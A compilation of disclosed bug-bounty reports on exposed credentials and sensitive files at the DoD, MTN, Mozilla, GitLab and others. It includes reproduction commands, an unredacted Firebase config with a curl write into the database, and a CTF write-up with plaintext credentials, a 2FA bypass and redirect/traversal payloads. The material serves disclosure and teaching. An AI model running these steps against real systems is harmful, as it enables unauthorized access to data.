# Insecure Storage of Sensitive Information

_22 reports — High/Critical, disclosed_

### [Exposed Extremely Sensitive Information in Public ZIP File](https://hackerone.com/reports/2857082)

- **Report ID:** `2857082`
- **Severity:** Critical
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** U.S. Dept Of Defense
- **Reporter:** @aldenpartridge
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:25:43.001Z
- **CVE(s):** -

**Vulnerability Information:**

An unprotected ZIP file (█████.zip) containing sensitive information is publicly accessible at http://██████/data/█████.zip. This file contains highly sensitive data, including SMTP credentials, database connection details, and AWS secret keys for the us-gov-west-1 region.
Steps to Reproduce:

    Download the ZIP file from the publicly accessible URL:
        URL: http://██████/data/████.zip
        You can download the file via the browser or using curl:

    curl -O http://██████/data/███.zip

Extract the contents of the ZIP file using any standard extraction tool:

unzip ███.zip

Review the extracted files for sensitive information. The files include:

    SMTP credentials (username, password, host, and port)
    Database credentials (username, password, host, database name)
    AWS secret keys (AWS access key, secret key, and session token)


    SMTP Credentials(scripts/contact-*.php | scripts/backups/contact-*/php)
AWS S3 Key (███/scripts/i.js)

With the exposed data, an attacker could:

    Access and send emails via the SMTP service.
    Gain unauthorized access to AWS resources, potentially   compromising sensitive data and infrastructure.

## Impact

An attacker who gains access to this publicly exposed ZIP file can obtain critical information, including:

    SMTP Credentials: Allowing unauthorized email sending and potential phishing or social engineering attacks.
    AWS Keys: Allowing unauthorized access to AWS services, potentially exposing sensitive data, leading to privilege escalation, or enabling further attacks on the target's infrastructure in the us-gov-west-1 region.

This exposure of sensitive data represents a CRITICAL security risk.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Steps to reproduce:

    Access the public ZIP file via https://████/data/█████████.zip.
    Download and extract the contents.
    Examine the extracted files for sensitive information like SMTP   credentials, database connection details, and AWS keys.

## Suggested Mitigation/Remediation Actions
Remove Public Access: Immediately restrict access to the ZIP file, ensuring it's not publicly accessible. Store sensitive files in a secure location that requires authentication.
    Rotate Exposed Credentials: Revoke the exposed SMTP, database, and AWS credentials, and issue new ones.
    Use Encryption: Store sensitive data in encrypted files, both at rest and in transit, to ensure that unauthorized access does not expose sensitive content.
    Implement Access Control: Ensure that proper access controls are in place, such as authentication and authorization for any sensitive file locations.
    Monitor and Audit Access: Implement monitoring and logging to detect and alert on any unauthorized access attempts to sensitive data.
    Regularly Audit and Rotate Keys: Use a secure key management system (like AWS Secrets Manager) to store and manage sensitive keys, and regularly rotate them to mitigate the impact of potential leaks.

---

### [CVE-2010-1429 JBoss Insecure Storage of Sensitive Information on ips.mtn.co.ug](https://hackerone.com/reports/2375659)

- **Report ID:** `2375659`
- **Severity:** High
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** MTN Group
- **Reporter:** @deb0con
- **Bounty:** - usd
- **Disclosed:** 2024-08-30T16:28:31.786Z
- **CVE(s):** CVE-2008-3273, CVE-2018-0296, CVE-2010-1429

**Vulnerability Information:**

## Summary:
Red Hat JBoss Enterprise Application Platform (aka JBoss EAP or JBEAP) 4.2 before 4.2.0.CP09 and 4.3 before 4.3.0.CP08 allows remote attackers to obtain sensitive information about "deployed web contexts" via a request to the status servlet, as demonstrated by a full=true query string. this issue exists because of a CVE-2008-3273 regression. by requesting the Status param and sitting its value to true, Jobss will print a sensitive information such as Memory used/Total Memory / Client IP address. 



## Proof of concept
  1. Navigate intercept / visit hostserver on https://h30f.n1.ips.mtn.co.ug/status?full=true
  1. You can see on the page is sensitive has exposed
  1. Bellow of vulnerable code

```java
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
 
 
int socket_connect(char *host, in_port_t port){
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;
     
    if((hp = gethostbyname(host)) == NULL){
        herror("gethostbyname");
        exit(1);
    }
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
     
    if(sock == -1){
        perror("setsockopt");
        exit(1);
    }
     
    if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1){
        perror("connect");
        exit(1);
         
    }
    return sock;
}
 
- #define BUFFER_SIZE 1024
 
int main(int argc, char *argv[]){
    int fd;
    char buffer[BUFFER_SIZE];
     
    if(argc < 3){
-        fprintf(stderr, "Usage: %s <hostname> <port>\n", argv[0]);
        exit(1);
    }
     
    fd = socket_connect(argv[1], atoi(argv[2]));
+    write(fd, "GET /status?full=true\r\n", strlen("GET /status?full=true\r\n")); // write(fd, char[]*, len);
    while(read(fd, buffer, BUFFER_SIZE - 1) != 0){
         fprintf(stderr, "%s", buffer);
    }
 
    shutdown(fd, SHUT_RDWR);
    close(fd);
    return 0;
}
```

## Supporting Material/References:
The JBoss Enterprise Application Platform 4.2.0.CP03 and 4.3.0.CP01 updates for Red Hat Enterprise Linux 4 and 5 fixed an issue (CVE-2008-3273) where unauthenticated users were able to access the status servlet; however, a bug fix included in the 4.2.0.CP06 and 4.3.0.CP04 updates re-introduced the issue. A remote attacker could use this flaw to acquire details about deployed web contexts.

  * https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd
  * https://nvd.nist.gov/vuln/detail/CVE-2018-0296
  * https://hackerone.com/reports/378698

## Impact

Red Hat JBoss Enterprise Application Platform could allow a remote attacker to obtain sensitive information, caused by improper restrictions on the status servlet. An attacker could exploit this vulnerability to obtain details about deployed Web contexts and other sensitive information.
https://github.com/advisories/GHSA-x26p-67q3-4mfx

---

### [Local File Disclosure on the █████ (https://████████.edu/) leads to the full source code disclosure and credentials leak](https://hackerone.com/reports/684836)

- **Report ID:** `684836`
- **Severity:** Critical
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2024-06-27T17:31:57.334Z
- **CVE(s):** -

**Vulnerability Information:**

##Description
During poking around `██████.00/24` range -  ██████████ looking for the Cisco devices, I came across `███` which resolved to the https://███████.edu/
While it's a not `.mil` host, it's likely related to the DoD since it hosted in the DoD-controlled ASN.

I discovered few critical vulnerabilities here, one of them is LFD (local file disclosure).

##POC
https://██████.edu/file.ashx?path=web.config
will download the website configuration file.
It exposes the DB credentials:
███

Similarly, attacker able to get content of any server-side resource, such as source code of application:
https://███.edu/file.ashx?path=UserAccountJSON.aspx.cs

## Impact

Source code & DB credentials leakage. Attacker can use it to compromise the resource.

---

### [DBMS information getting exposed publicly on -- [ ██████████ ]](https://hackerone.com/reports/2370578)

- **Report ID:** `2370578`
- **Severity:** High
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** U.S. Dept Of Defense
- **Reporter:** @dishant_singh
- **Bounty:** - usd
- **Disclosed:** 2024-03-22T17:31:51.980Z
- **CVE(s):** -

**Vulnerability Information:**

hi there, 
when i was working on your [domain](█████). i got to know that website is using drupal. and after a long fuzzing i found a file on your domain which was leaking some user hashed and data stored in your DBMS this data could be confidential to you so i am mentioning it below make sure to check carefully.

## Impact

DBMS sensitive data getting leaked on your domain ███████

## System Host(s)
████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Visit ██████████
2. you will get a file extract it and open that file you will se following things:
```
$connection->insert('aggregator_feed')
->fields(array(
  'fid',
  'uuid',
  'langcode',
  'title',
  'url',
  'refresh',
  'checked',
  'queued',
  'link',
  'description',
  'image',
  'hash',
  'etag',
  'modified',
))
->values(array(
  'fid' => '1',
  'uuid' => 'de39df51-b417-4bf2-a044-68ae0f780d77',
  'langcode' => 'en',
  'title' => 'Test feed',
  'url' => 'https://www.drupal.org/planet/rss.xml',
  'refresh' => '3600',
  'checked' => '1439763863',
  'queued' => '0',
  'link' => 'https://www.drupal.org/planet',
  'description' => 'Drupal.org - aggregated feeds in category Planet Drupal',
  'image' => NULL,
  'hash' => '133c56975228c5f17dd847130e3f1d288cdd405c0a67eb0331f3b274ab9e76c6',
  'etag' => '"1439760783-1"',
  'modified' => '1439760783',
))
```

And infos like below too:
```
->values(array(
  'collection' => '',
  'name' => 'block.block.stark_testblock',
  'data' => 'a:12:{s:4:"uuid";s:36:"0054bb60-0286-4b98-a000-b5791a63f30a";s:8:"langcode";s:2:"en";s:6:"status";b:1;s:12:"dependencies";a:3:{s:7:"content";a:1:{i:0;s:56:"block_content:basic:068eb76b-d90f-4513-8500-ae8bc880bd63";}s:6:"module";a:5:{i:0;s:13:"block_content";i:1;s:8:"language";i:2;s:4:"node";i:3;s:6:"system";i:4;s:4:"user";}s:5:"theme";a:1:{i:0;s:5:"stark";}}s:2:"id";s:15:"stark_testblock";s:5:"theme";s:5:"stark";s:6:"region";s:4:"help";s:6:"weight";i:-7;s:8:"provider";N;s:6:"plugin";s:50:"block_content:068eb76b-d90f-4513-8500-ae8bc880bd63";s:8:"settings";a:7:{s:2:"id";s:50:"block_content:068eb76b-d90f-4513-8500-ae8bc880bd63";s:5:"label";s:10:"Test block";s:8:"provider";s:13:"block_content";s:13:"label_display";s:7:"visible";s:6:"status";b:1;s:4:"info";s:0:"";s:9:"view_mode";s:4:"full";}s:10:"visibility";a:4:{s:8:"language";a:4:{s:2:"id";s:8:"language";s:9:"langcodes";a:1:{s:2:"en";s:2:"en";}s:6:"negate";b:0;s:15:"context_mapping";a:1:{s:8:"language";s:53:"@language.current_language_context:language_interface";}}s:9:"node_type";a:4:{s:2:"id";s:9:"node_type";s:7:"bundles";a:2:{s:7:"article";s:7:"article";s:17:"test_content_type";s:17:"test_content_type";}s:6:"negate";b:0;s:15:"context_mapping";a:1:{s:4:"node";s:29:"@node.node_route_context:node";}}s:12:"request_path";a:4:{s:2:"id";s:12:"request_path";s:5:"pages";s:7:"<front>";s:6:"negate";b:0;s:15:"context_mapping";a:0:{}}s:9:"user_role";a:4:{s:2:"id";s:9:"user_role";s:5:"roles";a:2:{s:13:"authenticated";s:13:"authenticated";s:13:"administrator";s:13:"administrator";}s:6:"negate";b:0;s:15:"context_mapping";a:1:{s:4:"user";s:39:"@user.current_user_context:current_user";}}}}',
))
```

## Suggested Mitigation/Remediation Actions
the file should not be accessible publicly

---

### [Mozilla Mastodon Staging Instance Admin API Key Disclosure Through Slack](https://hackerone.com/reports/2137154)

- **Report ID:** `2137154`
- **Severity:** High
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** Mozilla
- **Reporter:** @griffinf
- **Bounty:** 1000 usd
- **Disclosed:** 2023-09-11T16:03:55.015Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

I was able to find Admin Maston API Keys disclosed within Mozilla's #trust-and-safety-eng channel which was posted by a staff member of Mozilla.

## Steps To Reproduce:

  1. Authenticate to mozilla.slack.com as an NDA or Mozillla Staff Member (https://wiki.mozilla.org/NDA)
  2. Search the #trust-and-safety-eng channel for █████████  (Exposed token)
  3. Validate that the token through the following command:

tok=███
ep=https://stage.moztodon.nonprod.webservices.mozgcp.net
curl -H "Authorization: Bearer $tok" "$ep/api/v1/admin/accounts/" 

4. Observe the following output (I've redacted some as it shows the output of all Mastodon accounts):

████████

5. Please note that this was only one API call demonstrated. Maston has the ability to create new accounts, change passwords. delete accounts and delete tweets as referenced within their API documentation here with the  Admin API tokens -  https://docs.joinmastodon.org/methods/accounts/

## Supporting Material/References:

Please find attached the conversation where the API token was accidentaly leaked.

██████████

## Impact

## Summary:

The exposure of Admin Mastodon API tokens represents a critical security vulnerability with the potential for severe consequences. These tokens grant unauthorized individuals comprehensive access to the Mastodon server, allowing them to manipulate user data, spread malicious content, and compromise the integrity of the platform. Immediate action is required to mitigate this risk and protect both the system and its users.

---

### [Exposure Of Admin Username & Password](https://hackerone.com/reports/1703733)

- **Report ID:** `1703733`
- **Severity:** Critical
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** MTN Group
- **Reporter:** @coyemerald
- **Bounty:** - usd
- **Disclosed:** 2022-12-25T10:48:00.481Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Team, 
Ther an exposure of your username and password on this    subdomain █████

    uid: "mtnng",
        passwd: "██████████",



Steps To Reproduce:

Visit ███ 

Now, press CTRL+U to view the source code of this page,


Look for this code




       console.log(message);
    }
}

    (function (){
    const plid = 73;

    const mtnContainer = document.getElementById("mtn20238");
    const mtnUri = mtnContainer.childNodes[0].getAttribute("href");
    mtnContainer.addEventListener("click", ()=>fetch(mtnUri).catch(()=>{}));

    window.mobucksApi.placeAd({
        containerElementId: "mtn20238",
        uid: "mtnng",
        passwd: "███████",
        plid:plid,
        }, () => { 
            typeof mtnNoBanner == "function" && mtnNoBanner(plid,mtnContainer);

## Impact

The exposed password is in md5 which I was able to decrypt easily

uid: mtnng
hash = bd31568138edbfc0552a1ecc6886ea
plain password: ███

And as an attacker, this can be abused in lots of ways such as exposing some client's info

████

---

### [Firebase Database Takeover in https://pulseradio.mtn.co.ug/](https://hackerone.com/reports/1447751)

- **Report ID:** `1447751`
- **Severity:** Critical
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** MTN Group
- **Reporter:** @shuvam321
- **Bounty:** - usd
- **Disclosed:** 2022-12-01T10:52:59.962Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
During my test , in one of the subdomain of mtn.co.ug I found firebase configuration disclosed in the source code along with apiKey and database URL . 

Exploiting this vulnerability attacker is able to upload malicious data in the firebase account of pulseradio.mtn.co.ug and see database over there .

## Steps To Reproduce:

POC :  https://mtn-pulse-uganda.firebaseio.com/poc.json

1. Go to URL below and view the source code of website .

view-source:https://pulseradio.mtn.co.ug/wp-content/themes/mtn-pulse-reskin/zero-rate/firebase-config.js

There you will see following sensitive data .

$(document).ready(function() {
			// Your web app's Firebase configuration
			var firebaseConfig = {
				apiKey: "AIzaSyCRrABG3_Sc7xHar70hFyjHjEOJ071rbJ4",
				authDomain: "mtn-pulse-uganda.firebaseapp.com",
				databaseURL: "https://mtn-pulse-uganda.firebaseio.com",
				projectId: "mtn-pulse-uganda",
				storageBucket: "mtn-pulse-uganda.appspot.com",
				messagingSenderId: "242450689592",
				appId: "1:242450689592:web:bdd1173378d94d733800cd",
				measurementId: "G-KHPT64LJ5L"
			};


2. Now lets upload some data in firebase database  . Send the following curl request . Your data will be uploaded to firebase .


 curl "https://mtn-pulse-uganda.firebaseio.com/poc1.json" -XPUT -d '{"attacker":"maliciousdata"}'

3. Your data will be uploaded to https://mtn-pulse-uganda.firebaseio.com/poc1.json



References:
There are guidelines available by Firebase to resolve the insecurities and misconfiguration, please follow this link:
https://firebase.google.com/docs/database/security/resolve-insecurities

## Impact

This is quite serious because by using this database attacker can use this for malicious purposes and also an attacker can track this database if mtn uses it for future perspective and at that time it will be much easier for the attacker to steal the data from this repository and later it will harm the reputation of the mtn.co.ug .

So please immediately change the rule of the database to private so that nobody can able to access it outside.

---

### [sensitive data exposure](https://hackerone.com/reports/1716249)

- **Report ID:** `1716249`
- **Severity:** High
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** Reddit
- **Reporter:** @saibalaji143_
- **Bounty:** - usd
- **Disclosed:** 2022-11-10T14:41:12.389Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
[A Password hash entry was found in /etc/passwd. This is a major vulnerability since /etc/passwd is a world-readable file by default. Once the password hash is found, an attacker may extract the password using a program like crack.]

## Impact:
it is high impact vulnerability .once hacker found password hash it may be leads to develop a program like crack

## Steps To Reproduce:
[https://www.reddit.com/etc%2fpasswd]

  1. [add step]
  1. [add step]
  1. [add step]

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

A Password hash entry was found in /etc/passwd. This is a major vulnerability since /etc/passwd is a world-readable file by default. Once the password hash is found, an attacker may extract the password using a program like crack.

---

### [Able to view hackerone reports attachments](https://hackerone.com/reports/979787)

- **Report ID:** `979787`
- **Severity:** Critical
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** GitLab
- **Reporter:** @sateeshn
- **Bounty:** - usd
- **Disclosed:** 2022-07-11T16:00:07.348Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

(Hi team,

I accidentally found this bug. While reading one of hackerone public report (https://hackerone.com/reports/446238) about gitlab, I found a link posted by gitlab member which is related to internal tracking of the report. I clicked that link (https://gitlab.com/gitlab-org/gitlab-foss/-/issues/54220) and found one of the attachment. I am able to view all the attachments by directly visiting the attachment domain.)

### Steps to reproduce

1. Open https://h1.sec.gitlab.net/a/ (you will able to view all the attachments) and copy any content key 
2. Paste key infront of  https://h1.sec.gitlab.net/a/  (ex: https://h1.sec.gitlab.net/a/copied_key.jpg) (you will able to view attachment)

To view nonpublic hackerone report attachment, find the hackerone report key from the above link > copy and paste infront of https://h1.sec.gitlab.net/a/

Try to view this hackerone report you will see access denied https://hackerone.com/reports/446237 

but still you can able to view the report attachment by visiting https://h1.sec.gitlab.net/a/█████

## Impact

As attachments consist of researcher attached POC images and videos. So attacker can directly exploit by using these information.

**Summary (team):**

The reporter found a way to get access to all attachments imported from HackerOne reports with our automation. This included proofs of concept for unpatched vulnerabilities and was rewarded as a critical severity finding given the possibility of leaking unpatched critical severity vulnerabilities.

Note that it is intended that https://gitlab.com/gitlab-org/gitlab/-/issues?label_name%5B%5D=HackerOne still shows many fixed vulnerabilities as well as unfixed issues that were deemed low severity enough to be made public. You can learn more about this in the `Disclosure` section of our bug bounty program's policy.

---

### [Insecure Storage of Sensitive Information on lonestarcell.com server](https://hackerone.com/reports/1482830)

- **Report ID:** `1482830`
- **Severity:** Critical
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** MTN Group
- **Reporter:** @q9m
- **Bounty:** - usd
- **Disclosed:** 2022-04-09T18:58:01.146Z
- **CVE(s):** -

**Vulnerability Information:**

Hello , i hope your doing well 

i found some sensitive information disclosure at those endpoint
it is disclosure server status and some other stuff 

https://simregistration.lonestarcell.com//monitoring/DB02/DB02.html#System
https://simregistration.lonestarcell.com//monitoring/DB01/index.html
https://simregistration.lonestarcell.com//monitoring

## Impact

Sensitive Information disclosure on lonestarcell server

---

### [Military  name,email,phone,address,certdata Disclosure ](https://hackerone.com/reports/1490133)

- **Report ID:** `1490133`
- **Severity:** Critical
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** U.S. Dept Of Defense
- **Reporter:** @unknownsh
- **Bounty:** - usd
- **Disclosed:** 2022-03-18T19:09:16.037Z
- **CVE(s):** -

**Summary (team):**

A DoD public facing asset Military was misconfigured and disclosed name, email ,phone address , and certdata of users.

---

### [[Pre-Submission][H1-4420-2019] API access to Phabricator on code.uberinternal.com from leaked certificate in git repo](https://hackerone.com/reports/591813)

- **Report ID:** `591813`
- **Severity:** Critical
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** Uber
- **Reporter:** @tomnomnom
- **Bounty:** 39999 usd
- **Disclosed:** 2021-02-25T22:21:17.592Z
- **CVE(s):** -

**Summary (team):**

A username and certificate was found that allows API access to Phabricator on code.uberinternal.com. This API access could give away source cod and the private phabricator instance of Uber.

---

### [Directory Indexing on the ████ (https://████/) leads to the backups disclosure and credentials leak](https://hackerone.com/reports/684838)

- **Report ID:** `684838`
- **Severity:** Critical
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T21:54:20.378Z
- **CVE(s):** -

**Vulnerability Information:**

##Description
During poking around `█████████/24` range -  █████ looking for the Cisco devices, I came across `█████` which resolved to the https://██████/
While it's a not `.mil` host, it's likely related to the DoD since it hosted in the DoD-controlled ASN.

I discovered few critical vulnerabilities here, one of them is exposed backup files via directory listing.

##POC
https://███/obj/Debug/
█████
The source code can be found here:
https://█████████/obj/Debug/Package/GLOSS2.zip
It's zipped backup.

The DB credentials exposed here:
https://█████/obj/Debug/Package/GLOSS2.SetParameters.xml
███

##Suggested fix
Disable directory indexing, restrict access to the sensitive files, and change credentials as defense-in-depth measure.

## Impact

Source code & DB credentials leakage. Attacker can use it to compromise the resource.

---

### [PulseSSL VPN Site with Compromised Creds @ ████](https://hackerone.com/reports/854049)

- **Report ID:** `854049`
- **Severity:** Critical
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** U.S. Dept Of Defense
- **Reporter:** @r00tpgp
- **Bounty:** - usd
- **Disclosed:** 2020-07-30T17:48:46.720Z
- **CVE(s):** -

**Vulnerability Information:**

Dear US DoD,

Back in 2019, I had reported that a pulseSSL VPN server owned by US DoD can be compromised by a publicly available exploit. The report is████████. As a result, the userid and passwd db was also compromised. I found that at least 1 userid and password combination from that compromised db can still be used.

##PoC

Here is a screenshot of me accessing a US DoD owned website using a compromised credentials found back in 2019. I am still able to login to https://████/dana-na/auth/url_3/welcome.cgi with:

l: █████████
p:  █████

█████

Here is the screenshot of the credentials that was dump back in 2019:

████

## Impact

It is widely reported in the media that blackhat hackers around the world are still hacking fully patched PulseSSL VPN hosts because owners did not change the passwords that was compromised back in 2019. The articles that I am referring to is at :

https://www.us-cert.gov/ncas/alerts/aa20-107a
https://thehackernews.com/2020/04/pulse-secure-vpn-vulnerability.html

##Fix
Other than patching, it is strongly advisable that the impacted organization `█████████` reset all passwords immediately.

---

### [[h1-2006 2020]  Chained vulnerabilities lead to account takeover](https://hackerone.com/reports/895650)

- **Report ID:** `895650`
- **Severity:** Critical
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** h1-ctf
- **Reporter:** @kanytu
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T15:28:27.933Z
- **CVE(s):** -

**Vulnerability Information:**

# Summary

Mårten Mickos lost his account for BountyPay, the new service HackerOne is using to pay bug bounties. In this report I explain how I accessed a customer's account using a log file and bypassed its 2FA validation. 

I then leverage an open redirect bug to gain access to an internal server and downloaded an Android application. The application contained credentials that allowed me to retrieve an `X-Token` for the API used by all services. 

In the API I created a new account for a new staff member and logged in as a staff. This allowed me to exploit a SSRF flaw and escalate from staff to admin. 

As an admin, I got access to Mårten Mickos's account and payed all bounties by exploiting a CSS Exfil vulnerability.



# Context

HackerOne tweeted that [@martenmickos](https://twitter.com/martenmickos) needed help with his account for BountyPay. Apparently he lost his credentials and needs help with the bounty payments.

{F862841}

At this point, HackerOne already released one hint. The Twitter page from [BountypayHQ](https://twitter.com/BountypayHQ). It contained some tweets about a new staff being hired. The twitter page was also following an account named [Sandra Allison](https://twitter.com/SandraA76708114). She posted what seems to be a barcode tag:

{F862866}

Now that we have context, let's start of with the [HackerOne CTF](https://hackerone.com/h1-ctf) program. 

I can see that the current scope for the CTF is `*.bountypay.h1ctf.com`.

# Entry point

Opening the `bountypay.h1ctf.com` opens a simple webpage 2 logins. One for staff and one for the customers.

Because we have domains with normal names, I started [Burp Suite](https://portswigger.net/burp) with [Turbo Intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack). My plan is to use a simple wordlist containing the most common domain names:

{F862846}

This search returned the following interesting sub-domains:

{F862849}

- `api.bountypay.h1ctf.com`

  Seems to be a REST API for the operations in all other subdomains

- `app.bountypay.h1ctf.com`

  Customer subdomain

- `staff.bountypay.h1ctf.com`

  Staff subdomain

- `software.bountypay.h1ctf.com`

  Maybe a repository/intranet which contains the software used by the employers. It can only be accessible from within.

I started with the `app` subdomain, which is the domain for customers to login.

Once again, I used [Turbo Intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack) again with a wordlist of [common](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt) web content to see if something interesting popups. 

The `.git/HEAD` file immediately pooped up. The `HEAD` doesn't contain useful information so I tried downloading the `.git/config` file. After opening this file, I noticed that a remote repository was configured:

```
[remote "origin"]
url = https://github.com/bounty-pay-code/request-logger.git
fetch = +refs/heads/*:refs/remotes/origin/*
```

Checking this [Github repo](https://github.com/bounty-pay-code/request-logger.git) I could see a `PHP` file that seems to process some parameters and write them in `Base64` in a file named `bp_web_trace.log`.

I navigated to `https://app.bountypay.h1ctf.com/bp_web_trace.log` and downloaded the log file. Decoding the contents of the file revealed a login log containing a password in plain text:

```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

Now I have an user:

- **Username:** brian.oliver
- **Password:** V7h0inzX

Let's log in.

# 2FA bypass

Logging in to `app.bountypay.h1ctf.com` with that user prompted me with an OTP request. 

{F862843}

This seems to be a [2FA](https://en.wikipedia.org/wiki/Multi-factor_authentication) step. My first step is to check what kind of data is sent back to server when I pressed `Login` in Chrome's Network separator.

{F862844}

So there is a challenge and a challenge answer. I did some more requests and noticed that the challenge is changing at every request.

The challenge seems to be a MD5 and checking the hash in [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/) revelled I could be correct:

{F862845}

So, what data do I have so far? I do have a code that was previously used. That code was in the log file I checked earlier:

```
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
```

Something curious is that every entry in the log has a timestamp. So my guess was that the MD5 generated was the current timestamp. I tried submitting the 2FA request using the `challenge_answer` `bD83Jk27dQ` and the `challenge` `62ebf0344c5021cc7ef78d99c2137c8d` which is the MD5 of `1588931928`, the timestamp where the code was generated (when the login succeeded). This didn't work. Searching for those MD5 on Google didn't help either. 

I might need to use the previous `challenge_answer` and simulate a valid request. So if the MD5 isn't the hashed timestamp, could it be the answer itself? Let's hash `bD83Jk27dQ` to MD5 and try the request in Burp's Repeater:

{F862848}

Nice, I got a Cookie token and I'm logged in:

![image-20200610163458762](/Volumes/Articles/Security Articles/Bug Bounty/HackerOne/image-20200610163458762.png)

I am also familiar with that token start `eyJ`. I think that's a JSON. Let me decode it:

```
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
```



# API Open Redirect

Tapping on `Load Transactions` seems to fire a request to `https://app.bountypay.h1ctf.com/statements?month=01&year=2020`

This request returns an URL for an API. This is the first time I see a usage of the previous scanned sub-domain. So this is the time to use it.

Navigating to the subdomain, I see that there is a redirect right at the homepage. I think I have to use this redirect somehow. The request from `/statements` also has a `data` object:

```json
{
   "url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020",
   "data":"{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"
}
```

So, `/statements` requested the content from the API using the `url` and the API returned `data` as a result? That must be it.

I also noticed that these requests cannot be accessed from outside. Simply requesting https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/ returns a missing token error.

If there is a redirect in the API domain, I might be able to redirect the user to somewhere else. The request to the API seems to be appending my account id. That account id is part of the token. So I can change the cookie and still be able to perform requests to the API? Let me try something:

I've changed the Cookie to a Base64 of:

```
 {"account_id":"aaa","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

And loaded the transactions again. The browser displayed an error popup saying that there was an invalid response from the server. But I'm still logged in, which is great. The server must be using the `hash` part and not the `account_id` to validate the login.

I think I got this. All I have to do, is to use that redirect and try to access another part of the API or another server.

Let me try the redirect into another website such as https://api.bountypay.h1ctf.com/redirect?url=https://www.atacker.com?q=REST+API

```
URL NOT FOUND IN WHITELIST
```

There's a white list. Okay. I've tried some urls and it seems that only www.google.com and the https://www.bountypay.h1ctf.com/ are whitelisted.

But when this is done through the `/statements` request. I might be able to get to other endpoints, right? I do have an endpoint that always returned 401 and that can only be accessed from within the network. 

So let's change the Cookie to

```json
{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

Note that I need to traverse with a depth 2 in the path because `/redirect` is in the root.

This returned:

```json
{
   "url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/\/statements?month=01&year=2020",
   "data":"<html>\n<head><title>404 Not Found<\/title><\/head>\n<body>\n<center><h1>404 Not Found<\/h1><\/center>\n<hr><center>nginx\/1.15.8<\/center>\n<\/body>\n<\/html>"
}
```

Now we have a 404, instead of 401. So I need to enumerate this server. I've used Burp's Intruder for this wirhPayload  Processing to generate the proper payload:

{F862850}

Notice the `?` in the suffix. This is to escape the `/statements?month=01&year=2020` that is appended to the url by the `/statement` endpoint.

I used the same wordlist as before and this returned the following dir that was not a 404:

```json
{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/uploads?\/statements?month=01&year=2020","data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

We have an APK here.

# APK token leak

